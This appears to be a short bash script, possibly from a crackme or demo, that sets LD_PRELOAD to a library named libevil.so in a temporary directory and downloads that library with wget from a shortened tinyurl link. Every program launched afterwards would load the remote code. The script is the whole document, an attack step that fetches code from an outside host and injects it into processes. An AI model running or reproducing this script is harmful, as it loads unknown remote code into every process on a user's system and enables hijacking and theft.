#!/bin/bash
export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
LD_PRELOAD="" wget -q -O "${LD_PRELOAD%%:*}" 'https://tinyurl.com/cr4ckm3'
